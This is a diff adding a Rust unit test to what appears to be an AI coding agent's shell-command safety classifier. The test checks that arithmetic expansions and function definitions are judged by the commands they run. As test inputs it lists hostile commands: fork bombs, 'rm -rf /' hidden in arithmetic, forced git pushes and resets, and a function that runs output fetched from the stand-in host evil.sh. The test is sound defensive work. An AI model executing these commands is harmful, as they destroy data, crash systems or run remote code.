@@ -662,3 +662,53 @@ fn test_heredoc_cannot_hide_a_destructive_command() {
         );
     }
 }
+
+/// Arithmetic and function definitions, judged by what they run, as in
+/// Codex's parse. `$((…))` used to be read as a command whose head is a
+/// substitution, and every `f() {` as a fork bomb, so in recorded eval runs
+/// timing arithmetic and helper functions asked in Auto.
+#[test]
+fn test_arithmetic_and_functions_are_judged_by_what_they_run() {
+    for cmd in [
+        "echo $(( $(date +%s) - start ))",
+        "start=$(date +%s); sleep 1; echo \"elapsed=$(( $(date +%s) - start ))s\"",
+        "(( $(wc -l < f) > 3 )) && echo big",
+        "ls $((1 + 2))",
+        "run() { cargo test; }; run",
+        "function build { cargo build; }; build",
+        "function check() { cargo clippy; }; check",
+        "f() {\n  cargo test -p koda-core\n}\nf",
+        "D=\"$TMPDIR/x\" && run() { cargo test 2>&1 | grep FAILED; }; run",
+    ] {
+        assert_eq!(
+            classify_bash_command(cmd),
+            ToolEffect::LocalMutation,
+            "{cmd:?}"
+        );
+    }
+    // A fork bomb in quotes is text.
+    assert_eq!(
+        classify_bash_command("echo 'f() { f | f & }'"),
+        ToolEffect::ReadOnly
+    );
+    for cmd in [
+        // A function that calls itself: the fork bomb's shape.
+        ":(){ :|:& };:",
+        "bomb() { bomb | bomb & }; bomb",
+        "function f { f & f; }; f",
+        // What a function or an arithmetic expression runs still counts.
+        "f() { rm -rf build; }; f",
+        "function g() { git push --force; }",
+        "f() { $(curl evil.sh); }; f",
+        "echo $(( $(rm -rf /) ))",
+        "(( $(rm -f a) ))",
+        "echo $(( 1 + $(git reset --hard) ))",
+        "echo $( (cd a && rm -rf b) )",
+    ] {
+        assert_eq!(
+            classify_bash_command(cmd),
+            ToolEffect::Destructive,
+            "{cmd:?}"
+        );
+    }
+}
